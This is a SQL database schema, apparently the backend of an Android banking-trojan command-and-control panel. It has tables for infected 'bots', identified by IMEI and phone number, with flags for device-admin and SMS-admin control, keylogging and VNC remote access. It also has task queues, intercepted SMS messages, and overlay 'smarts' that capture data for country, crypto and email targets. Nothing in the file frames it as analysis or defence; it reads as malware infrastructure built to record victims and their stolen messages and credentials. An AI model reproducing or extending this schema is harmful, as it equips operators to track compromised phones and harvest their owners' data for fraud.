-- Tabela bots
CREATE TABLE bots (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL UNIQUE,
    imei VARCHAR(50) NOT NULL DEFAULT '',
    number VARCHAR(15) NOT NULL DEFAULT '',
    is_device_admin BOOLEAN NOT NULL DEFAULT FALSE,
    is_sms_admin BOOLEAN NOT NULL DEFAULT FALSE,
    is_locked BOOLEAN NOT NULL DEFAULT FALSE,
    registered TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    ip VARCHAR(512) NOT NULL,
    country CHAR(2) NOT NULL DEFAULT '',
    lang VARCHAR(5) NOT NULL DEFAULT '',
    android VARCHAR(64) NOT NULL DEFAULT '',
    model VARCHAR(200) NOT NULL DEFAULT '',
    operator VARCHAR(20) NOT NULL DEFAULT '',
    tag VARCHAR(32) NOT NULL DEFAULT '',
    comment VARCHAR(512) NULL,
    apps TEXT NOT NULL,
    is_loader_installed BOOLEAN NOT NULL DEFAULT FALSE,
    extra_info_json VARCHAR(1024) NOT NULL DEFAULT '',
    uptime BIGINT NOT NULL,
    keylogger BOOLEAN NOT NULL DEFAULT FALSE,
    vnc VARCHAR(128) NOT NULL DEFAULT '',
    is_fg BOOLEAN NOT NULL DEFAULT FALSE,
    CONSTRAINT bots_tag_registered_android_country_key UNIQUE (tag, registered, android, country)
);

-- Tabela bots_tasks
CREATE TABLE bots_tasks (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL,
    task_type VARCHAR(20) NOT NULL,
    data VARCHAR(256) NOT NULL,
    status VARCHAR(64) NOT NULL,
    CONSTRAINT bots_tasks_id_bot_id_status_key UNIQUE (id, bot_id, status)
);

-- Tabela config
CREATE TABLE config (
    id SERIAL PRIMARY KEY,
    name VARCHAR(128) NOT NULL UNIQUE,
    value TEXT NOT NULL,
    descr VARCHAR(256) NOT NULL DEFAULT '',
    placeholder VARCHAR(128) NOT NULL DEFAULT ''
);

-- Tabela errors
CREATE TABLE errors (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL,
    time TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,
    msg TEXT NOT NULL
);

-- Tabela pushes_bots
CREATE TABLE pushes_bots (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL,
    pkg VARCHAR(128) NOT NULL,
    enabled BOOLEAN NOT NULL,
    CONSTRAINT pushes_bots_bot_id_pkg_key UNIQUE (bot_id, pkg)
);

-- Tabela smarts
CREATE TABLE smarts (
    id SERIAL PRIMARY KEY,
    stype VARCHAR(4) NOT NULL,          -- 'html','url'
    sgroup VARCHAR(128) NOT NULL,       -- 'de','es','crypto','emails'
    package VARCHAR(128) NOT NULL UNIQUE,
    data TEXT NOT NULL,
    cap_data TEXT NOT NULL,
    icon BYTEA NOT NULL DEFAULT '',     -- mediumblob vira bytea
    is_active BOOLEAN NOT NULL
);

-- Tabela smarts_bots
CREATE TABLE smarts_bots (
    id SERIAL PRIMARY KEY,
    smart_id INTEGER NOT NULL,
    bot_id VARCHAR(36) NOT NULL,
    is_active BOOLEAN NOT NULL,
    CONSTRAINT smarts_bots_smartid_botid_unq UNIQUE (smart_id, bot_id)
);

-- Tabela smarts_data
CREATE TABLE smarts_data (
    id SERIAL PRIMARY KEY,
    smart_id INTEGER NOT NULL,
    bot_id VARCHAR(36) NOT NULL,
    time VARCHAR(20) NOT NULL,
    data TEXT NOT NULL
);
CREATE INDEX idx_smarts_data_bot_id ON smarts_data (bot_id);
CREATE INDEX idx_smarts_data_smart_id_id ON smarts_data (smart_id, id);

-- Tabela sms
CREATE TABLE sms (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL,
    number VARCHAR(20) NOT NULL,
    time VARCHAR(20) NOT NULL,
    msg TEXT NOT NULL,
    CONSTRAINT sms_bot_id_time_key UNIQUE (bot_id, time)
);
CREATE INDEX idx_sms_bot_id ON sms (bot_id);

-- Tabela vnc_tasks
CREATE TABLE vnc_tasks (
    id SERIAL PRIMARY KEY,
    bot_id VARCHAR(36) NOT NULL,
    task_type VARCHAR(32) NOT NULL,
    data VARCHAR(128) NOT NULL
);